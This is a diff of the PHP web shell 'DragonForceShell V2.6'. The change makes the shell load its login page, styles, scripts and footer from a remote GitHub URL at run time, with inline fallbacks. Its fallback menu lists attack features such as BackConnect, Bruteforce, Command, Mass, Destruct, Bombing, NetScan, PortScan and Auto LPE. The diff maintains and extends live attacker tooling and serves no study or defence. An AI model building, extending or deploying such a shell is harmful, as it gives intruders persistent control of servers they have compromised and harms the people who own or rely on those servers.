@@ -3333,9 +3333,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         return $contents;
     }
     public function DFSAdmin(){
-        // v2.3: prefer local template (your improved login.html), then remote, then inline fallback
-        $local = __DIR__ . '/contents/login.html';
-        if(is_file($local)){ $c = @file_get_contents($local); if($c!==false && $c!==""){ return $c; } }
+        // remote template only (test.php style) — GitHub is the source of truth, inline fallback if offline
         $c = $this->DFSFetch(self::$remote_url . "/login.html");
         if($c!==""){ return $c; }
         return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
@@ -3352,18 +3350,12 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         ."<input type='submit' name='login' value='UNLOCK'></form></div></body></html>";
     }
     public function DFStart(){
-        // v2.3: prefer local templates so `php -S` dev shows your edits without pushing to GitHub
-        $localHead = __DIR__ . '/contents/head.html';
-        $localCss  = __DIR__ . '/contents/dfs.css';
-        $localJs   = __DIR__ . '/contents/script.js';
-        if(is_file($localHead)){ $contents = @file_get_contents($localHead); }
-        else{ $contents = $this->DFSFetch(self::$remote_url . "/head.html"); }
+        // remote templates only (test.php style) — always pull latest UI from GitHub
+        $contents = $this->DFSFetch(self::$remote_url . "/head.html");
         if(!isset($contents)||$contents===""||$contents===false){ $contents = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>DragonForceShell V2.6 [DFS]</title><script>%{js}%</script><style>%{style}%</style></head><body><div style='text-align:center;color:#4d7cff;letter-spacing:3px'>DFS <span style='color:#f70000'>V2.6</span></div>%{body}%"; }
-        if(is_file($localCss)){ $css = @file_get_contents($localCss); }
-        else{ $css = $this->DFSFetch(self::$remote_url . "/dfs.css"); }
+        $css = $this->DFSFetch(self::$remote_url . "/dfs.css");
         if(!isset($css)||$css===""||$css===false){ $css = "body{background:#0d0b00;color:#FFD700;font-family:monospace} a{color:#FFD700}"; }
-        if(is_file($localJs)){ $js = @file_get_contents($localJs); }
-        else{ $js = $this->DFSFetch(self::$remote_url . "/script.js"); }
+        $js = $this->DFSFetch(self::$remote_url . "/script.js");
         if(!isset($js)||$js===false){ $js = ""; }
         $contents = preg_replace('/%{style}%/i',$css,$contents);
         $contents = preg_replace('/%{js}%/i',$js,$contents);
@@ -3371,21 +3363,17 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
     }
 
     public function DFSBody($location,$pattern,$from){
-        $local = __DIR__ . '/contents/' . basename($location);
-        if(is_file($local)){ $contents = @file_get_contents($local); }
-        else{ $contents = $this->DFSFetch(self::$remote_url . "/".$location); }
+        $contents = $this->DFSFetch(self::$remote_url . "/".$location);
         if(!isset($contents)||$contents===""||$contents===false){
-            // v2.3 local fallback nav (includes new actions)
-            $contents = "<section class=\"bodytop\"><ul><li><a href='%{A1}%'>Directory</a></li><li><a href='%{A2}%'>Config</a></li><li><a href='%{A3}%'>BackConnect</a></li><li><a href='%{A4}%'>Symlink</a></li><li><a href='%{A5}%'>Bruteforce</a></li><li><a href='%{A6}%'>Command</a></li><li><a href='%{A7}%'>Mass</a></li><li><a href='%{A8}%'>Database</a></li><li><a href='%{A9}%'>Destruct</a></li><li><a href='%{A10}%'>Bombing</a></li><li><a href='%{A12}%'>Search</a></li><li><a href='%{A13}%'>PHPInfo</a></li><li><a href='%{A14}%'>Auto LPE</a></li><li class='logout'><a href='%{A11}%'>Logout</a></li></ul></section>";
+            // inline fallback nav (only used when GitHub is unreachable)
+            $contents = "<section class=\"bodytop\"><ul><li><a href='%{A1}%'>Directory</a></li><li><a href='%{A2}%'>Config</a></li><li><a href='%{A3}%'>BackConnect</a></li><li><a href='%{A4}%'>Symlink</a></li><li><a href='%{A5}%'>Bruteforce</a></li><li><a href='%{A6}%'>Command</a></li><li><a href='%{A7}%'>Mass</a></li><li><a href='%{A8}%'>Database</a></li><li><a href='%{A9}%'>Destruct</a></li><li><a href='%{A10}%'>Bombing</a></li><li><a href='%{A12}%'>NetScan</a></li><li><a href='%{A13}%'>PortScan</a></li><li><a href='%{A14}%'>Search</a></li><li><a href='%{A15}%'>PHPInfo</a></li><li><a href='%{A16}%'>Auto LPE</a></li><li class='logout'><a href='%{A11}%'>Logout</a></li></ul></section>";
         }
         $from = $this->DFSRender($pattern,$contents,$from);
         return $from;
     }
 
     public function DFSEnd(){
-        $local = __DIR__ . '/contents/foot.html';
-        if(is_file($local)){ $contents = @file_get_contents($local); }
-        else{ $contents = $this->DFSFetch(self::$remote_url . "/foot.html"); }
+        $contents = $this->DFSFetch(self::$remote_url . "/foot.html");
         if(!isset($contents)||$contents===""||$contents===false){ $contents = "<section class='eagle'><p style='color:#fff;text-align:center'>DragonForceShell V2.6 by EagleEye</p></section>"; }
         return $contents;
     }
